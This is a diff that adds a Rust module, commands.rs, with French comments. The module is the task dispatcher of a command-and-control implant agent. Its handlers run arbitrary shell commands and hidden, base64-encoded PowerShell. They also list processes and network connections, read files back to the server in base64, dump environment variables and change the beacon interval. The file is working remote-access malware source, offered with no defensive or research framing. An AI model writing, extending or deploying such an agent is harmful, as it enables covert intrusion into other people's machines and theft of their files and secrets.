@@ -1,0 +1,201 @@
+// commands.rs — Exécution des tâches reçues du serveur C2
+//
+// Chaque TaskType du modèle a un handler correspondant ici.
+// Les handlers retournent toujours un TaskResult avec output/error.
+
+use crate::transport::{Task, TaskResult};
+use std::process::Command;
+
+/// Dispatcher — route chaque tâche vers le bon handler
+pub fn execute(task: &Task, agent_id: &str) -> TaskResult {
+    let payload = task.payload.as_deref().unwrap_or("");
+
+    let (output, error, success) = match task.task_type.as_str() {
+        "shell"      => run_shell(payload),
+        "powershell" => run_powershell(payload),
+        "proclist"   => list_processes(),
+        "download"   => download_file(payload),
+        "sleep"      => change_sleep(payload),
+        "netstat"    => get_netstat(),
+        "envdump"    => dump_env(),
+        "cd"         => change_directory(payload),
+        "pwd"        => print_directory(),
+        _            => (
+            String::new(),
+            format!("Unknown task type: {}", task.task_type),
+            false,
+        ),
+    };
+
+    TaskResult {
+        task_id:  task.id.clone(),
+        agent_id: agent_id.to_string(),
+        output,
+        error,
+        success,
+    }
+}
+
+// ─────────────────────────────────────────────────────────────
+// Handlers
+// ─────────────────────────────────────────────────────────────
+
+/// run_shell — exécute une commande shell Windows
+///
+/// Utilise cmd.exe /c pour une compatibilité maximale.
+/// stdout et stderr sont capturés et retournés au serveur.
+fn run_shell(cmd: &str) -> (String, String, bool) {
+    if cmd.is_empty() {
+        return (String::new(), "empty command".into(), false);
+    }
+
+    #[cfg(target_os = "windows")]
+    let result = Command::new("cmd.exe")
+        .args(["/c", cmd])
+        .output();
+
+    #[cfg(not(target_os = "windows"))]
+    let result = Command::new("sh")
+        .args(["-c", cmd])
+        .output();
+
+    match result {
+        Ok(output) => {
+            let stdout = String::from_utf8_lossy(&output.stdout).to_string();
+            let stderr = String::from_utf8_lossy(&output.stderr).to_string();
+            let success = output.status.success();
+            (stdout, stderr, success)
+        }
+        Err(e) => (String::new(), e.to_string(), false),
+    }
+}
+
+/// run_powershell — exécute du PowerShell
+///
+/// Flags importants :
+///   -NoP  : No Profile (chargement plus rapide)
+///   -NonI : Non-Interactive
+///   -W Hidden : Fenêtre cachée
+///   -Enc  : Commande encodée en base64 (évite les problèmes de caractères)
+fn run_powershell(script: &str) -> (String, String, bool) {
+    if script.is_empty() {
+        return (String::new(), "empty script".into(), false);
+    }
+
+    #[cfg(target_os = "windows")]
+    let result = {
+        // Encoder le script en UTF-16LE + base64 (format attendu par -EncodedCommand)
+        let utf16: Vec<u8> = script
+            .encode_utf16()
+            .flat_map(|c| c.to_le_bytes())
+            .collect();
+        let encoded = base64::Engine::encode(
+            &base64::engine::general_purpose::STANDARD,
+            &utf16,
+        );
+        Command::new("powershell.exe")
+            .args([
+                "-NoP",
+                "-NonI",
+                "-W", "Hidden",
+                "-EncodedCommand", &encoded,
+            ])
+            .output()
+    };
+
+    #[cfg(not(target_os = "windows"))]
+    let result = Command::new("pwsh")
+        .args(["-NonInteractive", "-Command", script])
+        .output();
+
+    match result {
+        Ok(output) => {
+            let stdout = String::from_utf8_lossy(&output.stdout).to_string();
+            let stderr = String::from_utf8_lossy(&output.stderr).to_string();
+            (stdout, stderr, output.status.success())
+        }
+        Err(e) => (String::new(), e.to_string(), false),
+    }
+}
+
+/// list_processes — liste les processus en cours
+fn list_processes() -> (String, String, bool) {
+    #[cfg(target_os = "windows")]
+    let (out, err, ok) = run_shell("tasklist /fo csv /nh");
+
+    #[cfg(not(target_os = "windows"))]
+    let (out, err, ok) = run_shell("ps aux --no-headers");
+
+    (out, err, ok)
+}
+
+/// download_file — lit un fichier et retourne son contenu en base64
+fn download_file(path: &str) -> (String, String, bool) {
+    match std::fs::read(path) {
+        Ok(data) => {
+            let encoded = base64::Engine::encode(
+                &base64::engine::general_purpose::STANDARD,
+                &data,
+            );
+            (encoded, String::new(), true)
+        }
+        Err(e) => (String::new(), e.to_string(), false),
+    }
+}
+
+/// change_sleep — modifie l'intervalle beacon
+fn change_sleep(payload: &str) -> (String, String, bool) {
+    match payload.parse::<u64>() {
+        Ok(secs) => (
+            format!("Sleep interval updated to {}s", secs),
+            String::new(),
+            true,
+        ),
+        Err(e) => (String::new(), e.to_string(), false),
+    }
+}
+
+/// get_netstat — connexions réseau actives
+fn get_netstat() -> (String, String, bool) {
+    #[cfg(target_os = "windows")]
+    return run_shell("netstat -ano");
+
+    #[cfg(not(target_os = "windows"))]
+    return run_shell("netstat -tulnp 2>/dev/null || ss -tulnp");
+}
+
+/// dump_env — variables d'environnement
+fn dump_env() -> (String, String, bool) {
+    let env: Vec<String> = std::env::vars()
+        .map(|(k, v)| format!("{}={}", k, v))
+        .collect();
+    (env.join("\n"), String::new(), true)
+}
+
+// Import base64 pour run_powershell
+use base64;
+
+/// change_directory — change le dossier courant de l'agent
+fn change_directory(path: &str) -> (String, String, bool) {
+    if path.is_empty() {
+        return (String::new(), "usage: cd <directory>".into(), false);
+    }
+    match std::env::set_current_dir(path) {
+        Ok(_) => {
+            // Retourner le nouveau chemin absolu si possible
+            match std::env::current_dir() {
+                Ok(new_path) => (format!("{}", new_path.display()), String::new(), true),
+                Err(_) => ("Directory changed".into(), String::new(), true),
+            }
+        }
+        Err(e) => (String::new(), e.to_string(), false),
+    }
+}
+
+/// print_directory — affiche le dossier courant
+fn print_directory() -> (String, String, bool) {
+    match std::env::current_dir() {
+        Ok(path) => (format!("{}", path.display()), String::new(), true),
+        Err(e) => (String::new(), e.to_string(), false),
+    }
+}
